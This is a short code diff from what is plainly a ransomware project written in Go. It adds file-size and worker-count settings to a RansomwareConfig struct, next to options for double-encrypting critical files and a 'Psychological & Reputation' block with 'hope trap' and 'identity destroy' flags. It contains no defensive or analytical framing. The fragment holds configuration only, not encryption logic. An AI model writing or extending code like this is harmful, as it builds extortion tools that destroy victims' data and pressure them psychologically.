@@ -64,6 +64,10 @@ type RansomwareConfig struct {
 	ShamirThreshold  int `json:"shamir_threshold"`
 	DoubleEncryptCritical bool `json:"double_encrypt_critical"`
 
+	MaxFileSize    int `json:"max_file_size"`
+	ScanWorkers    int `json:"scan_workers"`
+	EncryptWorkers int `json:"encrypt_workers"`
+
 	// Block 1: Psychological & Reputation
 	HopeTrapEnabled     bool   `json:"hope_trap_enabled"`
 	IdentityDestroy     bool   `json:"identity_destroy"`
